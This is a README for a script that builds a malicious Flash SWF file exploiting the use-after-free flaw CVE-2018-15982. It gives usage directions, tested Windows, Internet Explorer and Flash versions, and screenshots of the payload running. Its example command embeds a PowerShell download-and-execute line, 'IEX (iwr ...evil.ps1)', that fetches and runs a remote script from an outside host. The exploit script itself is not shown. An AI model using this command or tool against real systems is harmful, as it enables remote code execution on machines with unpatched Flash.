# Adobe Flash CVE-2018-15982

This script creates a swf payload for CVE-2018-15982, which is based off of the PoC from https://github.com/smgorelik/Windows-RCE-exploits.

The vulnerability is a use-after-free flaw enabling arbitrary code-execution in Flash.  More information can be found in the links below.

* https://threatpost.com/adobe-patches-zero-day-vulnerability-in-flash-player/139629/
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-15982



Usage:

```python create_swf.py <command> <output file name>```

Example Usage:

```python create_swf.py "powershell.exe IEX (iwr 'http://192.168.56.101/evil.ps1')" downloadtest.swf```
  


Tested on: 
* Windows 10 Enterprise 10.0.17134, Internet Explorer 11.285.17134.0
* Adobe Flash Player 31.0.0.153, 29.0.0.140


## Example


Create payload and confirm execution:

![alt text](https://github.com/kphongagsorn/adobe-flash/blob/master/images/create-and-confirm.png)


Executing malicious swf:

![alt text](https://github.com/kphongagsorn/adobe-flash/blob/master/images/exec.png)

